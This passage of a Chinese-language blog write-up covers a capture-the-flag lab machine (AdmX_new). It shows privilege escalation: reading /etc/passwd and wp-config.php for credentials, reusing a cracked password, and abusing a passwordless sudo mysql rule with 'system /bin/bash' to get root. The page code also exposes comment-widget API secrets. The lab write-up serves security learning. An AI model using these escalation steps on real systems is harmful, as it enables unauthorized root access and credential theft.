+<h4 id="第一次提权"><a href="#第一次提权" class="headerlink" title="第一次提权"></a>第一次提权</h4><p>​    我们回到命令行shell，使用命令<code>cat /etc/passwd | grep /bin/bash</code>查看系统用户账号</p>
+<p><img src="http://pic.charo.xyz/blog/202110102321240.png" alt></p>
+<p>发现了一个wpadmin账号，这应该是管理员账号了，我们查看它的文件夹</p>
+<p><img src="http://pic.charo.xyz/blog/202110121607859.png" alt></p>
+<p>发现只能由他自己才能查看，因此，提权成为唯一出路。</p>
+<p>使用命令<code>uname -a</code>查看内核版本，以及寻找针对它的内核漏洞，一无所获。</p>
+<p>使用命令<code>sudo -l</code>发现没有sudo权限。</p>
+<h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>​    这两条路都行不通，我们就想到<em>wordpress</em>框架的配置文件,里面可能有对应的数据库连接密码。</p>
+<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>​    通过命令<code>cat /var/www/html/wordpress/wp-config.php</code>查看配置文件</p>
+<p><img src="http://pic.charo.xyz/blog/202110102331685.png" alt></p>
+<p>我得到了一个账号和密码，但这个账号具体有没有用，我并不清楚。</p>
+<p>我第一反应是登陆一下这个数据库，使用命令<code>mysql -u admin -p Wp_Admin#123 -D wordpress</code>，发现并没有成功。</p>
+<p><img src="http://pic.charo.xyz/blog/202110102348493.png" alt></p>
+<p>由于密码的复用性，我决定尝试看看能不能用这个密码su到wpadmin用户，同样失败了。<img src="http://pic.charo.xyz/blog/202110102350508.png" alt></p>
+<p>在这时候我想起了另一个密码，在爆破web是得到的密码：adam14，我们拿它试一下。<img src="http://pic.charo.xyz/blog/202110102352129.png" alt></p>
+<p>​    意外惊喜，竟然成功了。</p>
+<p>我们回到主目录下查看local.txt，拿到第一个flag。<code>153495edec1b606c24947b1335998bd9</code></p>
+<p><img src="http://pic.charo.xyz/blog/202110102354068.png" alt></p>
+<h4 id="第二次提权"><a href="#第二次提权" class="headerlink" title="第二次提权"></a>第二次提权</h4><p>​    我们使用命令<code>sudo -l</code>发现了提权的方法</p>
+<p><img src="http://pic.charo.xyz/blog/202110121608574.png" alt></p>
+<p>我们发现我们不用密码就能执行这条命令，而且是root权限</p>
+<p>我们就使用命令<code>sudo /usr/bin/mysql -u root -D wordpress -p</code>，发现还是需要密码，果断使用<code>adam14</code>，成功。</p>
+<p><img src="http://pic.charo.xyz/blog/202110110000423.png" alt></p>
+<p>我们得到了具有root权限数据库的管理进程。</p>
+<p>数据库有一个<code>system</code>命令，可以执行操作系统命令。</p>
+<p>如果顺利的话这就比较简单了，我们可以通过命令<code>system /bin/bash</code> 或<code>\! /bin/bash</code>得到操作系统的root权限。</p>
+<p><img src="http://pic.charo.xyz/blog/202110110009819.png" alt></p>
+<p>很幸运，我们成功获得root权限以及第二个flag。<code>7efd721c8bfff2937c66235f2d0dbac1</code>，至此，提权成功，打靶结束。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>今日打靶复现：</strong></p>
+<ol>
+<li>我们通过<em>nmap</em>工具进行了主机扫描和端口及服务发现。</li>
+<li>利用<em>feroxuster</em>工具进行了隐藏目录爆破。</li>
+<li>使用BurpSuite的自动替换功能解决web页面加载缓慢的问题。</li>
+<li>发现wordpress CMS的登陆点wp-login，并对它进行密码爆破。</li>
+<li>进入后台通过编写插件的方式获得反弹shell。</li>
+<li>升级Full TTY，编辑404.php文件获得蚁剑shell。</li>
+<li>通过密码复用，登陆了wpadmin用户，获得了第一个flag。</li>
+<li>通过<code>sudo -l</code>，发现漏洞，并以root权限登陆了mysql命令行。</li>
+<li>通过命令<code>system /bin/bash</code>，我们成功获得root权限的shell，得到了第二个flag。</li>
+<li>打靶结束。</li>
+</ol>
+
+            </div>
+            <hr />
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">写作不易，客官能否打赏一杯奶茶？</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="http://pic.charo.xyz/blog/202111051411632.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="http://pic.charo.xyz/blog/202111051411098.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《打靶AdmX_new》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/posts/57827.html" property="cc:attributionName"
+               rel="cc:attributionURL">
+                slh
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '6d728b2e351d4a61784f',
+        clientSecret: '98174c889806c765a71247e0aa2a08a3bd45cce6',
+        repo: 'xifandanta.github.io',
+        owner: 'xifandanta',
+        admin: "xifandanta",
+        id: 'posts/57827.html',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+    <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->
+
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'n8wlMJPaRvNb30s57D7v8eKq-MdYXbMMI',
+        appKey: '1dEMInXJr7nMtSYMFvMaUQTG',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'wavatar',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '如果你没有GitHub账号，还可以在这里评论啦！'
+    });
+</script>
+
+
+<!-- ֱ������ -->
+<div id="to_comment" class="comment-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="n8wlMJPaRvNb30s57D7v8eKq-MdYXbMMI" title="ֱ������">
+        <i class="fas fa-comments"></i>
+    </a>
+</div>
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/44963.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="http://pic.charo.xyz/blog/41.jpg" class="responsive-img" alt="BurpSuite插件编写">
+                        
+                        <span class="card-title">BurpSuite插件编写</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Shiro,Fastjson,Jackson,Thinkphp,越权
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-10-14
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/BurpSuite插件编写/" class="post-category" target="_blank">
+                                    BurpSuite插件编写
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/博客/" target="_blank">
+                        <span class="chip bg-color">博客</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/31336.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="http://pic.charo.xyz/blog/12.jpg" class="responsive-img" alt="简单靶机">
+                        
+                        <span class="card-title">简单靶机</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            取得root权限+两个flag
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-10-02
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/靶机：Chronosb/" class="post-category" target="_blank">
+                                    靶机：Chronosb
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/博客/" target="_blank">
+                        <span class="chip bg-color">博客</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: pluto 小站<br />'
+            + '作者: slh<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
+    });
+</script>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            &copy; Copyright 2021 xifandanta 
+            <a href="http://www.beian.miit.gov.cn/" style="color:#FFFFFF" target="_blank">浙ICP备-2021030102号</a>
+
+            
+            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+            <span class="white-color">14.3k</span>
+            
+
+            <br>
+            <span id="sitetime"></span>
+
+            
+            
+            <br>
+            
+            <span id="busuanzi_container_site_pv" style='display:none'>
+                <i class="fa fa-heart-o"></i>
+                本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv" style='display:none'>
+                人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+            </span>
+            
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/xifandanta" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:slh9861@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://zhihu.com/people/xifandanta" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=1021593890&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/xifandanta" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+        <div class="col s12 m4 l4" align=center>本站由 <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src="/youpaiyun.png"  width="15%" style="margin: 20px 5px 5px 5px"/> </a>提供CDN加速</div>
+        
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);
+        var pvcountOffset = 500;
+        var uvcountOffset = 125;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int);
+            }
+        }
+    });
+</script>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2021, 09, 20, 00, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
+    </script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+    
+    <script src="/libs/others/clicklove.js"></script>
+    
+
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+</body>
+
+</html>
